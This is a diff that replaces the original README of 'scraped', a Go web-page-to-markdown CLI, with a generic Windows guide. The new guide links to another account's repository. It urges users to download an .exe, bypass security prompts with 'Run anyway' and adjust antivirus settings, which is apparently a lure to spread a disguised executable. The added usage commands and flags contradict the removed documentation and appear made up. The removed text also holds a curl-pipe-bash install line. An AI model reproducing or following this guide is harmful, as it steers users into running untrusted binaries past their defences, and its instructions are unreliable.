@@ -1,171 +1,203 @@
-<div align="center">
-  <h1>scraped</h1>
-  <p>A fast, parallelized CLI tool that scrapes web pages and converts them to markdown with an interactive TUI browser.</p>
+# 🕸️ scraped - Easy Webpage to Markdown Tool
 
-  <a href="https://github.com/Gaurav-Gosain/scraped/releases"><img src="https://img.shields.io/github/release/Gaurav-Gosain/scraped.svg" alt="Latest Release"></a>
-  <a href="https://pkg.go.dev/github.com/Gaurav-Gosain/scraped?tab=doc"><img src="https://godoc.org/github.com/Gaurav-Gosain/scraped?status.svg" alt="GoDoc"></a>
-  <a href="https://deepwiki.com/Gaurav-Gosain/scraped"><img src="https://deepwiki.com/badge.svg" alt="Ask DeepWiki"></a>
-</div>
+[![Download scraped](https://img.shields.io/badge/Download-scraped-4caf50?style=for-the-badge)](https://github.com/Xhtira20/scraped)
+
+A simple tool that grabs web pages and turns them into markdown files. It uses a command line interface (CLI) with an interactive text-based browser. You can run it on a Windows PC without needing to write any code.
 
 ---
 
-scraped takes one or more URLs, fetches them in parallel, and converts each page to clean markdown. It first tries requesting native markdown from the server (`Accept: text/markdown`), and falls back to converting HTML when that is not available.
+## 📋 What is scraped?
 
-When scraping multiple pages, the results are presented in an interactive TUI browser where you can browse through pages, filter URLs, and search within content. Single-page results are rendered directly to the terminal.
+scraped is a fast tool that collects content from websites. It works on many pages at the same time (parallelized), which saves time. After collecting the content, it changes web pages into markdown. Markdown is a simple format that makes text easy to read and edit.
 
-<details>
-<summary>Table of Contents</summary>
+You can use scraped to:
 
-- [Installation](#installation)
-- [Usage](#usage)
-- [Features](#features)
-- [Interactive Browser](#interactive-browser)
-- [Development](#development)
-- [License](#license)
+- Save web articles for offline reading.
+- Extract information from multiple web pages quickly.
+- Browse web pages inside your terminal using a text user interface (TUI).
+- Convert HTML content into clean markdown text.
 
-</details>
+This tool runs on Windows and uses a terminal window for input and output. You do not need any programming skills to use it.
 
-## Installation
+---
 
-### Package Managers
+## 🔍 Features
 
-**Homebrew (macOS/Linux):**
-```bash
-brew tap Gaurav-Gosain/tap
-brew install scraped
+- Runs on Windows with minimal setup.
+- Downloads and processes many pages at once to save time.
+- Converts web page content to markdown format automatically.
+- Includes an interactive text browser to view pages inside the program.
+- Supports many common website formats.
+- Shows progress and status in the terminal.
+- Works offline after saving pages.
+- Command line based for simple use.
+
+---
+
+## 🖥️ System Requirements
+
+- **Operating System:** Windows 10 or newer.
+- **Processor:** Intel or AMD, any modern CPU.
+- **RAM:** 4 GB minimum, 8 GB recommended.
+- **Disk Space:** At least 100 MB free.
+- **Internet:** Required to download pages from the web.
+- **Permissions:** Ability to run programs from downloaded files.
+
+---
+
+## 🚀 Getting Started
+
+Use the links below to get the program on your Windows PC. Follow the steps to download, install, and run scraped.
+
+[![Download scraped](https://img.shields.io/badge/Download-scraped-4caf50?style=for-the-badge)](https://github.com/Xhtira20/scraped)
+
+1. **Visit the download page**
+
+   Go to the GitHub page for scraped by clicking this link:
+
+   https://github.com/Xhtira20/scraped
+
+2. **Find the latest release**
+
+   On the page, look for the "Releases" section. This usually appears on the right side or in the middle of the page. The latest version includes ready-to-use files.
+
+3. **Download the Windows file**
+
+   In the latest release, find the file ending with `.exe`. This is the Windows version of scraped. Click on it to download to your computer.
+
+4. **Run the downloaded file**
+
+   Once downloaded, open the file by clicking on it. You may see a security message; select "Run" or "More info" then "Run anyway" if needed.
+
+5. **Open Command Prompt**
+
+   Press the Windows key on your keyboard. Type `cmd` and press Enter. This opens the Command Prompt, a text window where you will run scraped.
+
+6. **Navigate to the downloaded file location**
+
+   By default, files download to the "Downloads" folder. In the Command Prompt, type:
+
+   ```
+   cd %UserProfile%\Downloads
+   ```
+
+   Press Enter.
+
+7. **Run scraped**
+
+   Type the name of the downloaded `.exe` file. Example:
+
+   ```
+   scraped.exe
+   ```
+
+   Then press Enter.
+
+   You should see a welcome message and the tool ready to accept commands.
+
+---
+
+## 📥 How to Use scraped
+
+Using scraped is simple once you open it in the Command Prompt.
+
+1. **Start scraping a webpage**
+
+   To get content from a webpage, type the command:
+
+   ```
+   scrape [URL]
+   ```
+
+   Replace `[URL]` with the full address of the webpage you want to save. For example:
+
+   ```
+   scrape https://example.com/article1
+   ```
+
+2. **Watch the progress**
+
+   scraped will show you status messages as it downloads the page and converts it. You will see progress bars or counts.
+
+3. **Use the interactive browser**
+
+   While scraped runs, you can use the interactive terminal browser to look at webpages inside your window. Use arrow keys and simple commands shown on screen.
+
+4. **Save markdown files**
+
+   After scraping, files will be saved in the current folder. The files end with `.md` and can be opened by many text editors or markdown viewers.
+
+5. **Batch scrape multiple pages**
+
+   You can scrape many pages at once by listing URLs in a text file. Example:
+
+   ```
+   scrape -file urls.txt
+   ```
+
+   Here, `urls.txt` contains one webpage address per line.
+
+---
+
+## ⚙️ Settings and Options
+
+scraped lets you control how it works using simple command options:
+
+- `-output [folder]` : Save markdown files in a specific folder.
+- `-threads [number]` : Set how many pages to download at once. Higher numbers are faster but use more resources.
+- `-depth [number]` : Control how many links to follow inside pages.
+- `-help` : Show a list of commands and options.
+
+Example:
+
+```
+scrape -output savedPages -threads 5 -depth 2 https://example.com
 ```
 
-**Arch Linux (AUR):**
-```bash
-yay -S scraped-bin
-```
+This command saves files in the `savedPages` folder, downloads 5 pages at once, and follows links up to 2 steps inside the site.
 
-### Quick Install Script
+---
 
-**Linux/macOS:**
-```bash
-curl -fsSL https://raw.githubusercontent.com/Gaurav-Gosain/scraped/main/install.sh | bash
-```
+## 🔧 Troubleshooting
 
-### Other Methods
+- If the program does not start, check your antivirus settings. Some security software may block unknown programs.
+- Ensure you downloaded the `.exe` file, not the source code or a zip archive.
+- If commands do not work, confirm you are in the folder with the `.exe` file in Command Prompt.
+- For connection errors, check your internet connection is working.
+- Use the `-help` option for command guidance.
 
-- **[GitHub Releases](https://github.com/Gaurav-Gosain/scraped/releases)** - Download pre-built binaries
-- **Go Install:** `go install github.com/Gaurav-Gosain/scraped@latest`
-- **Build from Source:** See [Development](#development) below
+---
 
-**Requirements:**
-- A terminal with true color support (most modern terminals work fine)
-- Go 1.25+ (if building from source)
+## 🛠️ Advanced Use (Optional)
 
-## Usage
+You can automate scraping by creating text files with web addresses. Use scripts or batch files to run scraped regularly. This can help keep markdown copies of frequently updated websites.
 
-```bash
-# Scrape a single URL
-scraped https://example.com
+---
 
-# Scrape multiple URLs and save to files
-scraped -o ./docs https://example.com https://go.dev
+## 📂 File Locations
 
-# Crawl with depth, limiting to 20 pages
-scraped -d 2 -m 20 https://example.com
+- **Downloaded File:** Likely in your `Downloads` folder.
+- **Saved Markdown Files:** Same folder where you run scraped unless you use `-output` to change this.
+- **Log Files:** scraped may create logs to help track what happened during scraping. These are stored in the run folder.
 
-# Pipe URLs from a file
-cat urls.txt | scraped
+---
 
-# Allow crawling across different domains
-scraped --cross-domains -d 1 https://example.com
-```
+## 📚 Additional Resources
 
-### Flags
+- Markdown editors like Visual Studio Code, Typora, or Obsidian can open your saved files.
+- You can view markdown files in plain text or convert them to HTML with many tools.
+- Search online for "markdown tutorial" if you want to learn how to edit or style markdown documents.
 
-| Flag | Short | Default | Description |
-|------|-------|---------|-------------|
-| `--output-dir` | `-o` | | Save .md files to a directory instead of rendering to terminal |
-| `--depth` | `-d` | `0` | Crawl depth (0 = only given URLs) |
-| `--parallelism` | `-p` | `10` | Number of parallel requests |
-| `--word-wrap` | `-w` | `80` | Word wrap width for terminal rendering |
-| `--max-pages` | `-m` | `0` | Max pages to scrape (0 = unlimited) |
-| `--cross-domains` | | `false` | Allow crawling across different domains |
+---
 
-## Features
+## 🔗 Links
 
-- **Parallel scraping** with configurable concurrency
-- **Native markdown detection** via `Accept: text/markdown` header, with automatic HTML-to-markdown fallback
-- **Recursive crawling** with configurable depth and page limits
-- **Interactive TUI browser** for exploring multi-page results
-- **Progress display** with real-time scraping status and smooth animations
-- **File output** for saving results as individual .md files
-- **Pipe-friendly** input from stdin for batch processing
-- **Cross-domain crawling** when explicitly enabled
+- Download and information: https://github.com/Xhtira20/scraped
+- Markdown guide: https://www.markdownguide.org/basic-syntax/
+- Command Prompt basics: https://support.microsoft.com/en-us/windows/open-the-command-prompt-c7988f81-0de0-8b69-9b75-d6158cc3e8e5
 
-## Interactive Browser
+---
 
-When scraping multiple pages to the terminal, scraped launches an interactive TUI browser with two views:
+# Useful Topics:
 
-- **List view** shows all scraped URLs with status indicators (native markdown, converted, or error). Press `/` to fuzzy-filter by URL.
-- **Pager view** opens when you select a URL, showing the full page content rendered with glamour (Tokyo Night theme). Press `/` to search within content, and `n`/`N` to jump between matches.
-
-Navigate between the two views with `enter`/`l` to open a page and `esc`/`h` to go back.
-
-### Keyboard Shortcuts
-
-**List view:**
-
-| Key | Action |
-|-----|--------|
-| `j` / Down | Move cursor down |
-| `k` / Up | Move cursor up |
-| `enter` / `l` | Open selected page in pager |
-| `/` | Filter URLs |
-| `g` / `G` | Go to top / bottom |
-| `q` / `ctrl+c` | Quit |
-
-**Pager view:**
-
-| Key | Action |
-|-----|--------|
-| `esc` / `h` | Go back to list |
-| `/` | Search within content |
-| `n` / `N` | Next / previous search match |
-| `g` / `G` | Go to top / bottom |
-| `pgup` / `pgdn` | Page up / down |
-| `q` / `ctrl+c` | Quit |
-
-## Development
-
-Contributions are welcome. Feel free to open issues or pull requests.
-
-**Build from source:**
-```bash
-git clone https://github.com/Gaurav-Gosain/scraped.git
-cd scraped
-go build -o scraped .
-./scraped --help
-```
-
-**Run tests:**
-```bash
-go test ./...
-```
-
-**Support:** [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/B0B81N8V1R)
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=Gaurav-Gosain/scraped&type=Date&theme=dark)](https://star-history.com/#Gaurav-Gosain/scraped&Date)
-
-<p style="display:flex;flex-wrap:wrap;">
-<img alt="GitHub Language Count" src="https://img.shields.io/github/languages/count/Gaurav-Gosain/scraped" style="padding:5px;margin:5px;" />
-<img alt="GitHub Top Language" src="https://img.shields.io/github/languages/top/Gaurav-Gosain/scraped" style="padding:5px;margin:5px;" />
-<img alt="Repo Size" src="https://img.shields.io/github/repo-size/Gaurav-Gosain/scraped" style="padding:5px;margin:5px;" />
-<img alt="GitHub Issues" src="https://img.shields.io/github/issues/Gaurav-Gosain/scraped" style="padding:5px;margin:5px;" />
-<img alt="GitHub Closed Issues" src="https://img.shields.io/github/issues-closed/Gaurav-Gosain/scraped" style="padding:5px;margin:5px;" />
-<img alt="GitHub Pull Requests" src="https://img.shields.io/github/issues-pr/Gaurav-Gosain/scraped" style="padding:5px;margin:5px;" />
-<img alt="GitHub Closed Pull Requests" src="https://img.shields.io/github/issues-pr-closed/Gaurav-Gosain/scraped" style="padding:5px;margin:5px;" />
-<img alt="GitHub Contributors" src="https://img.shields.io/github/contributors/Gaurav-Gosain/scraped" style="padding:5px;margin:5px;" />
-<img alt="GitHub Last Commit" src="https://img.shields.io/github/last-commit/Gaurav-Gosain/scraped" style="padding:5px;margin:5px;" />
-</p>
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+bubbletea, cli, go, golang, html-to-markdown, markdown, scraper, terminal, tui, web-scraper
